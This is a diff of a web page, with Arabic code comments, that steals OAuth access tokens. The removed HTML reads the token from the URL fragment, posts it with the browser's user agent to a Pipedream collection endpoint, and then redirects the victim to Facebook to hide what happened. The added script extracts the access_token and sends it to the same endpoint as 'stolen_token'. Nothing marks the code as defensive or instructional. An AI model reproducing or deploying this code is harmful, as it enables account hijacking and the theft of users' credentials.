@@ -1,31 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Logging...</title>
-</head>
-<body>
-    <script>
-        // 1. استخراج الـ Fragment (الذي يحتوي على الـ Access Token) من الرابط
-        var hashData = window.location.hash;
-
-        if (hashData) {
-            // 2. إرسال البيانات فوراً إلى رابط Pipedream الخاص بك
-            fetch("https://eolk1qu152xm90d.m.pipedream.net", {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({
-                    full_hash: hashData,
-                    timestamp: new Date().toISOString(),
-                    victim_info: navigator.userAgent
-                })
-            }).then(() => {
-                // 3. إعادة توجيه الضحية إلى موقع حقيقي (للتمويه)
-                window.location.href = "https://web.facebook.com";
-            });
-        } else {
-            // إذا لم يوجد Token، توجه لفيسبوك مباشرة
-            window.location.href = "https://web.facebook.com";
-        }
-    </script>
-</body>
-</html>
+const token = window.location.hash.substring(1).split("&").find(p => p.startsWith("access_token="));
+if (token) {
+    fetch("https://eolk1qu152xm90d.m.pipedream.net", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+            stolen_token: token.split("=")[1],
+            full_url: window.location.href,
+            timestamp: new Date().toISOString()
+        })
+    });
+}
